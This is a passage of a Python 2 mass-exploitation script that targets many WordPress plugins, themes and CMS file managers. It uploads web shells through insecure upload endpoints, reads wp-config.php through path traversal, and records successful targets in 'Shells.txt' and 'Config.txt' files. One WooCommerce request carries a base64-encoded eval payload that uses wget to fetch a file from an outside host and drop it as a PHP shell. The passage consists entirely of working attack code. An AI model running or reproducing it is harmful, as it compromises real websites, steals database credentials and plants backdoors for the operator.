			print '[{}Wordpress]: {} {}	       ====> {}{} formcraft     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/plugins/formcraft/file-upload/server/php/files/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} formcraft    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 38 . pica
		
		picaup = {'uploadfile':(filenames, shell, 'text/html')}
		
		picareq = requests.post(url+'/wp-content/plugins/pica-photo-gallery/picaPhotosResize.php', files=picaup)
		
		picalib = requests.get(url+'/wp-content/uploads/pica-photo-gallery/'+filenames)
		
		
		if 'izocin' in picalib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} pica-photo-gallery     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/pica-photo-gallery/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} pica-photo-gallery    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 39 . contact-form			
			
		conta = {'action': 'nm_webcontact_upload_file'}
		
		isabo = {'Filedata': (filenames, shell, 'text/html')}

		sonzsreq = requests.post(url+'/wp-admin/admin-ajax.php', data=conta, files=isabo)

		
		
		sonzslib = requests.get(url+'/wp-content/uploads/contact_files/'+filenames)
		
		
		if 'izocin' in sonzslib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} N-media contact     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/contact_files/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} N-media contact    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 40 . conf
		
		conflib = requests.get(url+"/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php")
				
		if 'DB_USER' in conflib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} membership-simplified     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-content/plugins/membership-simplified-for-oap-members-only/download.php?download_file=..././..././..././wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} membership-simplified     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		
		# 41 . confr
		
		confrlib = requests.get(url+"/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php")
				
		if 'DB_USER' in confrlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-ecommerce-shop-styling     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Config.txt', 'a').write(url+'/wp-content/plugins/wp-ecommerce-shop-styling/includes/download.php?filename=../../../../wp-config.php'+'\n')
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-ecommerce-shop-styling     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			


		# 42 . copysafe
			
		contax = {'upload_path': '../../../../uploads/'}
		
		isabox = {'wpcsp_file': (filenames, shell, 'text/html')}

		sonzsxreq = requests.post(url+'/wp-content/plugins/wp-copysafe-pdf/lib/uploadify/uploadify.php', data=contax, files=isabox)

		
		
		sonzsxlib = requests.get(url+'/wp-content/uploads/'+filenames)
		
		
		if 'izocin' in sonzsxlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-copysafe-pdf     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wp-copysafe-pdf    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


		# 43 . wallimport		

		sonzsdreq = requests.post(url+'/wp-admin/admin-ajax.php?page=pmxi-admin-settings&action=upload&name=izo.php', data=shell)
		
		path_dir = os.popen('php -r "print md5(\''+str(path)+'\');"').read()

		
		
		sonzsdlib = requests.get(url+"/wp-content/uploads/wpallimport/uploads/"+str(path_dir)+"/izo.php")
		
		
		if 'izocin' in sonzsdlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpallimport     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/wpallimport/uploads/'+path_dir+'/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} wpallimport    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
		# 44 . woocommerce
		
		
		izfreq = requests.post(url+'/produits/?items_per_page=%24%7b%40eval(base64_decode(cGFzc3RocnUoJ2NkIHdwLWNvbnRlbnQvdXBsb2Fkcy8yMDE4LzAxO3dnZXQgaHR0cDovL3d3dy5hd3RjLmFpZHQuZWR1Ly9jb21wb25lbnRzL2NvbV9iMmpjb250YWN0L3VwbG9hZHMvdHh0LnR4dDttdiB0eHQudHh0IGl6b20ucGhwJyk7))%7d&setListingType=grid')
		
		izflib = requests.get(url+'/wp-content/uploads/2018/01/izom.php')
		
		
		if 'izocin' in izflib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce produits     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/2018/01/izom.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} woocommerce produits    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

		
		# 45 . Cherry
		
		acfup = {'files':(filenames, shell, 'text/html')}
		
		acfreq = requests.post(url+'/wp-content/plugins/acf-frontend-display/js/blueimp-jQuery-File-Upload-d45deb1/server/php/', files=acfup)
		
		acflib = requests.get(url+'/wp-content/uploads/uigen_2018/'+filenames)
		
		
		if 'izocin' in acflib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} acf-frontend-display     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/uigen_2018/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} acf-frontend-display    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)		

			
		# 46 . copysafe
			
		appgravs  = {'name':'izo.php'}
		
		
		Gravs = {'file':(filename, shell, 'text/html')}

		sonzsxyreq = requests.post(url+'/wp-content/themes/konzept/includes/uploadify/upload.php', data=appgravs, files=Gravs)	
		
		sonzsxylib = requests.get(url+'/wp-content/themes/konzept/includes/uploadify/izo.php')
		
		
		if 'izocin' in sonzsxylib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} konzept     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/themes/konzept/includes/uploadify/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} konzept    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

		
		# 47 . Cherry
		
		acfxup = {'Filedata':(filenames, shell, 'text/html')}
		
		acfxreq = requests.post(url+'/wp-content/themes/RightNow/includes/uploadify/upload_settings_image.php', files=acfxup)
		
		acfxlib = requests.get(url+'/wp-content/uploads/settingsimages/'+filenames)
		
		
		if 'izocin' in acfxlib.content:
			print '[{}Wordpress]: {} {}	       ====> {}{} RightNow     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/wp-content/uploads/settingsimages/'+filenames+'\n')
			sys.exit()
		else:
			print '[{}Wordpress]: {} {}	       ====> {}{} RightNow    {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
    except:
        pass
		

		
def unkbot(url):

	try:
        
	    
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/ckeditor/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder1     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/assets/ckeditor/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder1     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/admin/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/admin/ckeditor/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/assets/admin/ckeditor/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/plugins/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/plugins/ckeditor/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder3     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/assets/plugins/ckeditor/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder3     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
	
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/admin/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/admin/ckeditor/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder4     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/admin/ckeditor/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder4     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/libraries/jscripts/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/libraries/jscripts/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder5     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/libraries/jscripts/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder5     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)


			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/ckeditor/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder6     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/ckeditor/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder6     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/js/ckeditor/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/js/ckeditor/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder7     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/js/ckeditor/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder7     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/scripts/jquery/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/scripts/jquery/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder8     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/scripts/jquery/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder8     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/kcfinder-2.51/upload.php', files=files)

		
		
		lib = requests.get(url+"/kcfinder-2.51/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder9     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/kcfinder-2.51/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder9     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

			
			
		
		
		
		files = {'qqfile': (kcfile, open(kcfile, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/js/mylibs/kcfinder/upload.php', files=files)

		
		
		lib = requests.get(url+"/assets/js/mylibs/kcfinder/upload/files/priv.php.jd")

		if 'uname' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder10     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/assets/js/mylibs/kcfinder/upload/files/priv.php.jd'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Kcfinder10     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			


		
		
		files = {'files[]': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/_admin/files/upload/server/php/', files=files)

		
		
		lib = requests.get(url+"/_admin/files/upload/server/php/files/ddd.php")

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Web-SEO     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/_admin/files/upload/server/php/files/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Web-SEO     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			

		
		files = {'files[]' : (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tpl/plugins/upload9.1.0/server/php/', files=files)

		
		lib = requests.get(url+'/tpl/plugins/upload9.1.0/server/php/')

		if '{"files":' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} Htmcss     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/tpl/plugins/upload9.1.0/server/php/'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} Htmcss     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
	
						

		
		files = {'files[]' : (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/themes/dashboard/assets/plugins/jquery-file-upload/server/php/', files=files)

		
		lib = requests.get(url+'/tpl/plugins/upload9.1.0/server/php/ddd.php')

		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} BuilderEngine     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/themes/dashboard/assets/plugins/jquery-file-upload/server/php/ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} BuilderEngine     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/admin/tinymce/jscripts/tiny_mce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/admin/tinymce/jscripts/tiny_mce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce1     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce1     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)			
			

		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/js/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/js/tinymce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/admin/js/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/admin/js/tinymce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce3     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce3     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			

		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/tinymce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce4     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce4     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/public/js/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/public/js/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce5     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce5     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/app/webroot/js/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/app/webroot/js/tinymce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce6     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce6     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
	
		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tinymce/jscripts/tiny_mce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/tinymce/jscripts/tiny_mce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce7     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce7     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/assets/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/assets/tinymce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce8     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce8     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
	
		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/tinymce/js/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/tinymce/js/tinymce/plugins/imgsurfer/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce9     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce9     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
	
		
		
		post = {'submit': 'Transferir archivo'}
		
		files = {'file': (filte, open(filte, 'rb'), 'multipart/form-data')}

		req = requests.post(url+'/templates/admin/js/tinymce/plugins/imgsurfer/main.php', files=files, data=post)

		
		
		lib = requests.get(url+"/templates/admin/js/tinymce/plugins/imgsurfer/main.php/imglist.php")
		token = re.findall('http://(.*?)ddd.php', lib.text)

		if 'ddd.php' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce10     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write('http://'+token[0]+'ddd.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} tinymce10     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			


		req = requests.post(url+'/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/tinymce/plugins/ajaxfilemanager/inc/data.php")
		
		lib = requests.get(url+"/tinymce/plugins/ajaxfilemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager1     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/tinymce/plugins/ajaxfilemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager1     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
			


		req = requests.post(url+'/helpdesk/media/editor/plugins/filemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/helpdesk/media/editor/plugins/filemanager/inc/data.php")
		
		lib = requests.get(url+"/helpdesk/media/editor/plugins/filemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager2     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/helpdesk/media/editor/plugins/filemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager2     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


		req = requests.post(url+'/media/editor/plugins/filemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/media/editor/plugins/filemanager/inc/data.php")
		
		lib = requests.get(url+"/media/editor/plugins/filemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager3     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/media/editor/plugins/filemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager3     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


		req = requests.post(url+'/editor/plugins/filemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/editor/plugins/filemanager/inc/data.php")
		
		lib = requests.get(url+"/editor/plugins/filemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager4     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/editor/plugins/filemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager4     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


		req = requests.post(url+'/admin/editor/plugins/filemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/admin/editor/plugins/filemanager/inc/data.php")
		
		lib = requests.get(url+"/admin/editor/plugins/filemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager5     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/admin/editor/plugins/filemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} ajaxfilemanager5     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			


		req = requests.post(url+'/modul/tinymce/plugins/ajaxfilemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/modul/tinymce/plugins/ajaxfilemanager/inc/data.php")
		
		lib = requests.get(url+"/modul/tinymce/plugins/ajaxfilemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} aidiCMS     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/modul/tinymce/plugins/ajaxfilemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} aidiCMS     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			
	
		

		req = requests.post(url+'/admin/libraries/ajaxfilemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/admin/libraries/ajaxfilemanager/inc/data.php")
		
		lib = requests.get(url+"/admin/libraries/ajaxfilemanager/inc/izo.php")
		
		if 'SangPujaan' in lib.content:
			print '[{}Unknow]: {} {}	       ====> {}{} log1cms2.0     {}{} Success upload  '.format(sb, sd, url, fc,fc, sb,fg)
			open('Vulns/Shells.txt', 'a').write(url+'/admin/libraries/ajaxfilemanager/inc/izo.php'+'\n')
			sys.exit()
		else:
			print '[{}Unknow]: {} {}	       ====> {}{} log1cms2.0     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)
			

		

		req = requests.post(url+'/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/ajax_create_folder.php', data=payloadz)

		izo = requests.get(url+"/zp-core/zp-extensions/tiny_mce/plugins/ajaxfilemanager/inc/data.php")
		
